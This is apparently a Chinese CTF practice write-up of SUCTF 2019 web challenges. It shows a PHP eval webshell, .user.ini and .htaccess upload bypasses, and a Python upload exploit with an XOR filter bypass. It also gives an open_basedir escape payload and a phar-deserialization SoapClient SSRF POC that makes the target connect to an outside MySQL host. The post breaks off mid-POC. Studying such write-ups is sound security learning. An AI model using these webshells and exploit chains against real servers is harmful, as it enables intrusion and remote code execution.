<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="cop's blog"><link rel="stylesheet" type="text/css" href="//fonts.loli.net/css?family=Source+Code+Pro"><link rel="stylesheet" type="text/css" href="/css/style.css?v=2.0.5"><link rel="stylesheet" type="text/css" href="/css/highlight.css?v=2.0.5"><link rel="Shortcut Icon" href="/favicon.ico"><link rel="bookmark" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><title>SUCTF刷题记录 | cop's blog</title></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">SUCTF刷题记录</h1><a id="logo" href="/.">cop's blog</a><p class="description"></p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> Start</i></a><a href="/archives/"><i class="fa fa-archive"> Archiv</i></a><a href="/about/"><i class="fa fa-user"> Über</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div><div id="search-form"><div id="result-mask" class="hide"></div><label><input id="search-key" type="text" autocomplete="off" placeholder="Suche"></label><div id="result-wrap" class="hide"><div id="search-result"></div></div><div class="hide"><template id="search-tpl"><div class="item"><a href="/{path}" title="{title}"><div class="title">{title}</div><div class="time">{date}</div><div class="tags">{tags}</div></a></div></template></div></div></div><div id="layout" class="layout-g"><div class="layout-l"><div class="content_container"><div class="post"><h1 class="post-title">SUCTF刷题记录</h1><div class="post-meta"><a href="/2020/01/11/SUCTF刷题记录/#comments" class="comment-count"></a><p><span class="date">Jan 11, 2020</span><span><i id="busuanzi_container_page_pv"><i id="busuanzi_value_page_pv"></i><i>Schlägt</i></i></span></p></div><div class="post-content"><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>一看这道题和之前gxy那道上传很类似，加GIF89A文件头可以上传.htaccess文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"pHp"</span>&gt;@<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'a'</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>绕过&lt;?上传一个马，试了一下不能用<br>看了wp才知道这道题是nginx的环境，之前那道是apache<br>类似apache的.htaccess，nginx也有一个.user.ini文件<br>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[<br>‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。和php.ini不同的是，.user.ini是一个能被动<br>态加载的ini文件,不需要重启服务器就可以加载配置，不过很多重要的配置不能改，但还是能找到能利用的配置<br>auto_append_file、auto_prepend_file<br>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含<br>使用方法很简单，直接写在.user.ini中：<br>auto_prepend_file=xx.jpg<br><img src="https://images-cdn.shimo.im/KiaAuxGJPxsX3gtJ/image.png__thumbnail" alt></p>
<h2 id="EasyWeb"><a href="#EasyWeb" class="headerlink" title="EasyWeb"></a>EasyWeb</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">get_the_flag</span></span>()&#123;</span><br><span class="line">    // webadmin will remove your upload file every 20 min!!!! </span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">"upload/tmp_"</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!empty(<span class="variable">$_FILES</span>[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        <span class="variable">$extension</span> = substr(<span class="variable">$name</span>, strrpos(<span class="variable">$name</span>,<span class="string">"."</span>)+1);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,<span class="variable">$extension</span>)) die(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos3(file_get_contents(<span class="variable">$tmp_name</span>), <span class="string">'&lt;?'</span>)!==False) die(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype(<span class="variable">$tmp_name</span>)) die(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">"/"</span>.<span class="variable">$name</span>;</span><br><span class="line">        @move_uploaded_file(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        print_r(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$hhh</span> = @<span class="variable">$_GET</span>[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$hhh</span>)&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$hhh</span>)&gt;18)&#123;</span><br><span class="line">    die(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'</span><span class="string">"\`~_&amp;.,|=[\x7F]+/i', <span class="variable">$hhh</span>) )</span></span><br><span class="line"><span class="string">    die('Try something else!');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="variable">$character_type</span> = count_chars(<span class="variable">$hhh</span>, 3);</span></span><br><span class="line"><span class="string">if(strlen(<span class="variable">$character_type</span>)&gt;12) die("</span>Almost there!<span class="string">");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">eval(<span class="variable">$hhh</span>);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>无字符getshell,用%ff异或<br><img src="https://img-blog.csdnimg.cn/20190829213946559.png" alt><br><img src="https://img-blog.csdnimg.cn/20190829215408722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N0ZXBvbmU0d2FyZA==,size_16,color_FFFFFF,t_70" alt><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://41880861-6f99-4fce-a75f-6805f9868d95.node3.buuoj.cn/?_=<span class="variable">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;</span>&#123;%ff&#125;();&amp;%ff=get_the_flag"</span></span><br><span class="line">htaccess = b<span class="string">""</span><span class="string">"\x00\x00\x8a\x39\x8a\x39</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .cc</span></span><br><span class="line"><span class="string">php_value auto_append_file "</span>php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_95edeac63aff85469e0ebd216f87ce5a/shell.cc<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span><span class="string">""</span></span><br><span class="line"><span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">htaccess = b"</span><span class="string">""</span><span class="comment">#define width 1</span></span><br><span class="line"><span class="comment">#define height 1</span></span><br><span class="line">AddType application/x-httpd-php .cc</span><br><span class="line">php_value auto_append_file <span class="string">"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_95edeac63aff85469e0ebd216f87ce5a/shell.cc"</span></span><br><span class="line"></span><br><span class="line"><span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">"</span><span class="string">""</span></span><br><span class="line">shell = b<span class="string">"\x00\x00\x8a\x39\x8a\x39"</span>+b<span class="string">"00"</span>+ base64.b64encode(b<span class="string">"&lt;?php eval(<span class="variable">$_GET</span>['c']);?&gt;"</span>)</span><br><span class="line"><span class="comment">#shell = b"\x00\x00\x8a\x39\x8a\x39"+b"00"+ b"&lt;script language='php'&gt;eval($_REQUEST[c]);&lt;/script&gt;"</span></span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'file'</span>,(<span class="string">'.htaccess'</span>,htaccess,<span class="string">'image/jpeg'</span>))]</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line">r = requests.post(url=url, data=data, files=files)<span class="comment">#proxies=proxies)</span></span><br><span class="line"><span class="built_in">print</span>(r.text) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'file'</span>,(<span class="string">'shell.cc'</span>,shell,<span class="string">'image/jpeg'</span>))]</span><br><span class="line">r = requests.post(url=url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></p>
<p>附一道类似的<a href="https://www.xctf.org.cn/library/details/0c94ff6b44aa5798c34237788e04bd12eca90313/" target="_blank" rel="noopener">upload</a><br>script标记php在php7中不可用，所以这道题要base64编码shell，再配合.htaccess文件用伪协议包含shell<br><img src="https://images-cdn.shimo.im/0XEFGUm0AlwfapzA/image.png__thumbnail" alt><br>最后就是bypass open_basedir读flag<br>payload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chdir</span>(<span class="string">'xxx'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);print_r(scandir(<span class="string">'/'</span>));</span><br></pre></td></tr></table></figure></p>
<p><img src="https://images-cdn.shimo.im/hF21GqbNifYfzaYO/image.png__thumbnail" alt>\<br><img src="https://uploader.shimo.im/f/Wm9H9YH6jX4Bcyhy.png!thumbnail" alt></p>
<h2 id="upload2"><a href="#upload2" class="headerlink" title="upload2"></a>upload2</h2><p>admin.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">class Ad&#123;</span><br><span class="line"></span><br><span class="line">    public <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="variable">$clazz</span>;</span><br><span class="line">    public <span class="variable">$func1</span>;</span><br><span class="line">    public <span class="variable">$func2</span>;</span><br><span class="line">    public <span class="variable">$func3</span>;</span><br><span class="line">    public <span class="variable">$instance</span>;</span><br><span class="line">    public <span class="variable">$arg1</span>;</span><br><span class="line">    public <span class="variable">$arg2</span>;</span><br><span class="line">    public <span class="variable">$arg3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> __construct(<span class="variable">$cmd</span>, <span class="variable">$clazz</span>, <span class="variable">$func1</span>, <span class="variable">$func2</span>, <span class="variable">$func3</span>, <span class="variable">$arg1</span>, <span class="variable">$arg2</span>, <span class="variable">$arg3</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$this</span>-&gt;clazz = <span class="variable">$clazz</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;func1 = <span class="variable">$func1</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;func2 = <span class="variable">$func2</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;func3 = <span class="variable">$func3</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;arg1 = <span class="variable">$arg1</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;arg2 = <span class="variable">$arg2</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;arg3 = <span class="variable">$arg3</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">check</span></span>()&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$reflect</span> = new ReflectionClass(<span class="variable">$this</span>-&gt;clazz);</span><br><span class="line">        <span class="variable">$this</span>-&gt;instance = <span class="variable">$reflect</span>-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$reflectionMethod</span> = new ReflectionMethod(<span class="variable">$this</span>-&gt;clazz, <span class="variable">$this</span>-&gt;func1);</span><br><span class="line">        <span class="variable">$reflectionMethod</span>-&gt;invoke(<span class="variable">$this</span>-&gt;instance, <span class="variable">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$reflectionMethod</span> = new ReflectionMethod(<span class="variable">$this</span>-&gt;clazz, <span class="variable">$this</span>-&gt;func2);</span><br><span class="line">        <span class="variable">$reflectionMethod</span>-&gt;invoke(<span class="variable">$this</span>-&gt;instance, <span class="variable">$this</span>-&gt;arg2);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$reflectionMethod</span> = new ReflectionMethod(<span class="variable">$this</span>-&gt;clazz, <span class="variable">$this</span>-&gt;func3);</span><br><span class="line">        <span class="variable">$reflectionMethod</span>-&gt;invoke(<span class="variable">$this</span>-&gt;instance, <span class="variable">$this</span>-&gt;arg3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        system(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">'admin'</span>]))&#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$clazz</span> = <span class="variable">$_POST</span>[<span class="string">'clazz'</span>];</span><br><span class="line">        <span class="variable">$func1</span> = <span class="variable">$_POST</span>[<span class="string">'func1'</span>];</span><br><span class="line">        <span class="variable">$func2</span> = <span class="variable">$_POST</span>[<span class="string">'func2'</span>];</span><br><span class="line">        <span class="variable">$func3</span> = <span class="variable">$_POST</span>[<span class="string">'func3'</span>];</span><br><span class="line">        <span class="variable">$arg1</span> = <span class="variable">$_POST</span>[<span class="string">'arg1'</span>];</span><br><span class="line">        <span class="variable">$arg2</span> = <span class="variable">$_POST</span>[<span class="string">'arg2'</span>];</span><br><span class="line">        <span class="variable">$arg2</span> = <span class="variable">$_POST</span>[<span class="string">'arg3'</span>];</span><br><span class="line">        <span class="variable">$admin</span> = new Ad(<span class="variable">$cmd</span>, <span class="variable">$clazz</span>, <span class="variable">$func1</span>, <span class="variable">$func2</span>, <span class="variable">$func3</span>, <span class="variable">$arg1</span>, <span class="variable">$arg2</span>, <span class="variable">$arg3</span>);</span><br><span class="line">        <span class="variable">$admin</span>-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"You r not admin!"</span>;</span><br></pre></td></tr></table></figure></p>
<p>class.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">class File&#123;</span><br><span class="line">    public <span class="variable">$file_name</span>;</span><br><span class="line">    public <span class="variable">$type</span>;</span><br><span class="line">    public <span class="variable">$func</span> = <span class="string">"Check"</span>;</span><br><span class="line">    <span class="keyword">function</span> __construct(<span class="variable">$file_name</span>)&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;file_name = <span class="variable">$file_name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;</span><br><span class="line">        <span class="variable">$class</span> = new ReflectionClass(<span class="variable">$this</span>-&gt;func);</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable">$class</span>-&gt;newInstanceArgs(<span class="variable">$this</span>-&gt;file_name);</span><br><span class="line">        <span class="variable">$a</span>-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">getMIME</span></span>()&#123;</span><br><span class="line">        <span class="variable">$finfo</span> = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        <span class="variable">$this</span>-&gt;<span class="built_in">type</span> = finfo_file(<span class="variable">$finfo</span>, <span class="variable">$this</span>-&gt;file_name);</span><br><span class="line">        finfo_close(<span class="variable">$finfo</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()&#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;<span class="built_in">type</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Check&#123;</span><br><span class="line">    public <span class="variable">$file_name</span>;</span><br><span class="line">    <span class="keyword">function</span> __construct(<span class="variable">$file_name</span>)&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;file_name = <span class="variable">$file_name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">check</span></span>()&#123;</span><br><span class="line">        <span class="variable">$data</span> = file_get_contents(<span class="variable">$this</span>-&gt;file_name);</span><br><span class="line">        <span class="keyword">if</span> (mb_strpos(<span class="variable">$data</span>, <span class="string">"&lt;?"</span>) !== FALSE) &#123;</span><br><span class="line">            die(<span class="string">"&amp;lt;? in contents!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>func.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">"submit"</span>]) &amp;&amp; isset(<span class="variable">$_POST</span>[<span class="string">"url"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i'</span>,<span class="variable">$_POST</span>[<span class="string">'url'</span>]))&#123;</span><br><span class="line">        die(<span class="string">"Go away!"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$file_path</span> = <span class="variable">$_POST</span>[<span class="string">'url'</span>];</span><br><span class="line">        <span class="variable">$file</span> = new File(<span class="variable">$file_path</span>);</span><br><span class="line">        <span class="variable">$file</span>-&gt;getMIME();</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;p&gt;Your file type is '<span class="variable">$file</span>' &lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h3><p>index.php是一个上传文件的地方，只能上传图片类型文件<br>finfo_file/finfo_buffer/mime_content_type都可以触发phar反序列化<br>上传一个phar文件，反序列化点在<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getMIME</span></span>()&#123;</span><br><span class="line">        <span class="variable">$finfo</span> = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        <span class="variable">$this</span>-&gt;<span class="built_in">type</span> = finfo_file(<span class="variable">$finfo</span>, <span class="variable">$this</span>-&gt;file_name);</span><br><span class="line">        finfo_close(<span class="variable">$finfo</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>因为有过滤不能使用phar开头，用php://filter/resource=phar://upload/2c67ca1eaeadbdc1868d67003072b481/b5e9b4f86ce43ca65bd79c894c4a924c.gif 绕过</p>
<h3 id="反序列化配合soapclient类进行ssrf"><a href="#反序列化配合soapclient类进行ssrf" class="headerlink" title="反序列化配合soapclient类进行ssrf"></a>反序列化配合soapclient类进行ssrf</h3><p>触发点找到了接下来就是构造pop链了，在admin.php中只要绕过$_SERVER[‘REMOTE_ADDR’] == ‘127.0.0.1’<br>就可以直接控制system参数，这时我尝试直接访问admin.php，用xff，client-ip都不行，看了wp才知道解法<br>file类中有个__wakeup<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;</span><br><span class="line">        <span class="variable">$class</span> = new ReflectionClass(<span class="variable">$this</span>-&gt;func);</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable">$class</span>-&gt;newInstanceArgs(<span class="variable">$this</span>-&gt;file_name);</span><br><span class="line">        <span class="variable">$a</span>-&gt;check();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>ReflectionClass是一个反射类，在class.php中没有什么有用的类，我尝试能不能直接实例化admin.php中的类，结果是不行，应该只能实例化<br>同文件内的类和php自带的类<br>实例化soapcliet，该类的构造函数如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public SoapClient :: SoapClient （mixed <span class="variable">$wsdl</span> [，array <span class="variable">$options</span> ]）</span><br></pre></td></tr></table></figure></p>
<p>第一个参数是用来指明是否是wsdl模式。</p>
<p>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发<br>送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。<br>而在wsdl模式下，参数是不可控的，所以设置第一个参数为null，构造一个post请求包,去请求本地的admin<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> = array(null, array(<span class="string">"location"</span> =&gt; <span class="variable">$target</span>,<span class="string">"user_agent"</span>=&gt;<span class="string">"zedd\r\nContent-Type: application/x-www-form-urlencoded\r\n"</span>.join(<span class="string">"\r\n"</span>,<span class="variable">$headers</span>).<span class="string">"\r\nContent-Length: "</span>.(string)strlen(<span class="variable">$post_string</span>).<span class="string">"\r\n\r\n"</span>.<span class="variable">$post_string</span>,<span class="string">"uri"</span>      =&gt; <span class="string">"mfk"</span>));</span><br></pre></td></tr></table></figure></p>
<p>完整的poc<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class File&#123;</span><br><span class="line">    public <span class="variable">$file_name</span>;</span><br><span class="line">    public <span class="variable">$type</span>;</span><br><span class="line">    public <span class="variable">$func</span> = <span class="string">"SoapClient"</span>;</span><br><span class="line">    <span class="keyword">function</span> __construct(<span class="variable">$file_name</span>)&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;file_name = <span class="variable">$file_name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$target</span> = <span class="string">'http://127.0.0.1/admin.php'</span>;</span><br><span class="line">// <span class="variable">$target</span> = <span class="string">"http://106.14.153.173:2015"</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">'admin=1&amp;clazz=Mysqli&amp;func1=init&amp;arg1=&amp;func2=real_connect&amp;arg2[0]=106.14.153.173&amp;arg2[1]=root&amp;arg2[2]=123&amp;arg2[3]=test&amp;arg2[4]=3306&amp;func3=query&amp;arg3=select%201&amp;ip=106.14.153.173&amp;port=2015'</span>;</span><br><span class="line"><span class="variable">$headers</span> = array(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    );</span><br><span class="line">// <span class="variable">$b</span> = new SoapClient(null,array(<span class="string">"location"</span> =&gt; <span class="variable">$target</span>,<span class="string">"user_agent"</span>=&gt;<span 